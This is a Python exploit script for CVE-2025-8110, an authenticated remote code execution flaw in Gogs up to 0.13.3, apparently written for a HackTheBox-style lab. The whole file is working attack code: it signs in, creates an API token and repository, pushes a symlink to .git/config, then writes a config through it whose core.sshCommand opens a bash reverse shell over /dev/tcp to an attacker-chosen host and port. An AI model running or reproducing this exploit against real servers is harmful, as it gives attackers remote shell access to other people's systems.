#!/usr/bin/env python3
"""Ghostlink Gogs symlink RCE (CVE-2025-8110).

Authenticated RCE against Gogs <= 0.13.3. Gogs' PutContents API validates the
path but not the destination of a symbolic link, so we commit a symlink that
points at .git/config, then write a malicious config through it. The injected
core.sshCommand is executed the next time Gogs runs a git operation over SSH.

Usage: python3 gogs_symlink_rce.py -u <url> -U <user> -P <pass> -h <lhost> -p <lport>
"""
import argparse
import base64
import os
import shutil
import subprocess
import time
from urllib.parse import urlparse

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = "[*]"


def parse_csrf(page_text):
    tag = BeautifulSoup(page_text, "html.parser").select_one("input[name=_csrf]")
    if not tag or not tag.get("value"):
        raise SystemExit("[-] could not locate CSRF token")
    return tag.get("value")


def sign_in(sess, base_url, username, password):
    """Log in and keep the authenticated session cookie."""
    csrf = parse_csrf(sess.get(f"{base_url}/user/login").text)
    resp = sess.post(
        f"{base_url}/user/login",
        data={"_csrf": csrf, "user_name": username, "password": password},
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        raise SystemExit("[-] login failed (bad credentials?)")
    print(f"{BANNER} logged in as {username}")


def obtain_token(sess, base_url):
    """Create an application token in the user's settings."""
    page = sess.get(f"{base_url}/user/settings/applications").text
    csrf = parse_csrf(page)
    resp = sess.post(
        f"{base_url}/user/settings/applications",
        data={"_csrf": csrf, "name": os.urandom(6).hex()},
        allow_redirects=True,
    )
    info = BeautifulSoup(resp.text, "html.parser").find("div", class_="ui info message")
    if not info:
        raise SystemExit("[-] could not retrieve application token")
    token = info.find("p").text.strip()
    print(f"{BANNER} application token: {token}")
    return token


def make_repo(sess, base_url, token):
    repo = os.urandom(6).hex()
    headers = {"Authorization": f"token {token}"}
    resp = sess.post(
        f"{base_url}/api/v1/user/repos",
        json={"name": repo, "auto_init": True, "readme": "Default"},
        headers=headers,
    )
    print(f"{BANNER} repo '{repo}' created (HTTP {resp.status_code})")
    return repo


def plant_symlink(base_url, username, password, repo):
    """Clone the repo, commit a symlink that targets .git/config, push it."""
    parsed = urlparse(base_url)
    workdir = f"/tmp/ghostlink-{repo}"
    if os.path.exists(workdir):
        shutil.rmtree(workdir)
    clone_url = (
        f"{parsed.scheme}://{username}:{password}@{parsed.netloc}"
        f"{parsed.path.rstrip('/')}/{username}/{repo}.git"
    )
    subprocess.run(["git", "clone", clone_url, workdir], check=True, capture_output=True)
    os.symlink(".git/config", os.path.join(workdir, "planted_link"))
    subprocess.run(["git", "add", "planted_link"], cwd=workdir, check=True)
    subprocess.run(
        ["git", "-c", "user.name=ops", "-c", "user.email=ops@ghostlink.htb",
         "commit", "-m", "plant symlink"],
        cwd=workdir, check=True, capture_output=True,
    )
    subprocess.run(["git", "push", "origin", "master"], cwd=workdir, check=True, capture_output=True)
    print(f"{BANNER} symlink planted and pushed")


def fire_payload(sess, base_url, token, username, repo, payload_config):
    """Write the malicious config through the symlink via the PutContents API."""
    url = f"{base_url}/api/v1/repos/{username}/{repo}/contents/planted_link"
    body = {"message": "config update", "content": base64.b64encode(payload_config.encode()).decode()}
    headers = {"Authorization": f"token {token}"}
    try:
        sess.put(url, json=body, headers=headers, timeout=8)
    except requests.exceptions.ReadTimeout:
        pass  # server may hang while the shell fires
    print(f"{BANNER} payload written, check the listener")


def build_payload_config(shell_cmd, repo):
    return (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tlogallrefupdates = true\n"
        "\tignorecase = true\n"
        "\tprecomposeunicode = true\n"
        f"\tsshCommand = {shell_cmd}\n"
        '[remote "origin"]\n'
        f"\turl = git@localhost:gogs/{repo}.git\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        '[branch "master"]\n'
        "\tremote = origin\n"
        "\tmerge = refs/heads/master\n"
    )


def main():
    ap = argparse.ArgumentParser(description="Gogs CVE-2025-8110 symlink RCE")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-U", "--username", required=True)
    ap.add_argument("-P", "--password", required=True)
    ap.add_argument("-H", "--lhost", required=True)
    ap.add_argument("-p", "--lport", required=True)
    args = ap.parse_args()

    sess = requests.Session()
    sess.verify = False

    sign_in(sess, args.url, args.username, args.password)
    token = obtain_token(sess, args.url)
    repo = make_repo(sess, args.url, token)
    plant_symlink(args.url, args.username, args.password, repo)

    shell = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' #"
    payload_config = build_payload_config(shell, repo)
    time.sleep(1)
    fire_payload(sess, args.url, token, args.username, repo, payload_config)


if __name__ == "__main__":
    main()
